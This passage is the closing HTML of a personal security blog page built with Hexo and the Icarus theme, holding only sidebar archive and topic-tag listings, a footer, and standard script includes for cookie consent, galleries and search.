href="/categories/Vuln-Analysis/">Vuln-Analysis</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/03/"><span class="level-start"><span class="level-item">March 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/02/"><span class="level-start"><span class="level-item">February 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">January 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">August 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Antivirus-Evasion/"><span class="tag">Antivirus Evasion</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Blue-Teaming/"><span class="tag">Blue Teaming</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/C/"><span class="tag">C#</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/C-C/"><span class="tag">C&amp;C++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/C2/"><span class="tag">C2</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CVE/"><span class="tag">CVE</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CodeQL/"><span class="tag">CodeQL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Environment/"><span class="tag">Environment</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Format-String/"><span class="tag">Format String</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JNDI/"><span class="tag">JNDI</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java/"><span class="tag">Java</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Memory-Forensics/"><span class="tag">Memory Forensics</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/OffSec/"><span class="tag">OffSec</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PWN/"><span class="tag">PWN</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PowerShell/"><span class="tag">PowerShell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Priv-Escalation/"><span class="tag">Priv-Escalation</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Red-Teaming/"><span class="tag">Red Teaming</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">4xpl0r3r</a><p class="is-size-7"><span>&copy; 2023 4xpl0r3r</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>